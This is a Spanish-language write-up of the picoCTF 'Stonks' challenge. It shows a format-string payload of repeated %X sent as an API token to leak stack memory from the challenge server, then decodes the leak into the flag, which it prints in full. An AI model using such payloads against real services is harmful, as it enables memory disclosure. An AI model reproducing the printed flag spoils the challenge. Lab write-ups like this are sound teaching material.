## Objetivo
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/e4d297ce964e4f54225786fe7b153b4b/vuln.c) `nc mercury.picoctf.net 20195`
## Solución
En este reto nos dan un comando para poder acceder al reto, asi que nos conectamos:
```
nc mercury.picoctf.net 20195`
```

Vemos que nos arroja:
```
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
```

En la descripción del reto nos dan el código del programa asi que lo analizamos, 

Investigando un poco encontramos que al pasarle la cadena:
```
**%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%**
```

En la opción 1 del programa nos regresa la direccion de memoria en heexadecimal:
```
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%
Buying stonks with token:
892F3F0804B00080489C3F7F66D80FFFFFFFF1892D160F7F74110F7F66DC70892E1804892F3D0892F3F06F6369707B465443306C5F49345F74356D5F6C6C306D5F795F79336E3534303664303664FFB4007DF7FA1AF8F7F74440150B950010F7E03CE9F7F750C0F7F665C0F7F66000FFB48BD8F7DF468DF7F665C08048ECAFFB48BE40F7F88F09804B000F7F66000F7F66E20FFB48C18F7F8ED50F7F67890150B9500F7F66000804B000FFB48C188048C86892D160FFB48C04FFB48C188048BE9F7F663FC0FFB48CCCFFB48CC411892D160150B9500FFB48C3000F7DA9FA1F7F66000F7F660000F7DA9FA11FFB48CC4FFB48CCCFFB48C5410F7F66000F7F8970AF7FA10000F7F6600000799554BAA5B3F2AA000180486300
Portfolio as of Tue Nov 12 20:48:24 UTC 2024


4 shares of VG
5 shares of QWCH
16 shares of XF
15 shares of QB
8 shares of PCLG
3 shares of QCRK
308 shares of MTR
325 shares of JPNR
Goodbye!
```

Tomando la dirección y metiendola a la pagina Hex to ASCII nos da:
```
/?°H?fØÿÿÿñ-tfÜp./=óðocip{FTC0l_I4_t5m_ll0m_y_y3n5406d06dÿ´}÷úø÷÷D@÷à<é÷÷PÀ÷öeÀ÷ö`ÿ´Ø÷ßF÷öeÀHì¯ûH¾@÷ø	KffâûHÁÕgP¹Pf°ÿ´HÈhÑ`ÿ´ÿ´H¾f?Àÿ´Ìÿ´Ä-P¹PûHÃ}©úff÷Ú¡ûHÌOûHÌÏûHÅAfp¯¡÷ö`yTº¥³òªHc
```

Que al parecer contiene la flag asi que la extraemos, pero vemos que no esta en el formato correcto, asi que la acomodamos, tomando los primeros 4 carateres y revirtiendolos, y asi de 4 een 4:
```
ocip{FTC0l_I4_t5m_ll0m_y_y3n5406d06d}
```

Flag:
```
picoCTF{I_l05t_4ll_my_m0n3y_6045d60d}
```
## Notas adicionales
## Referencias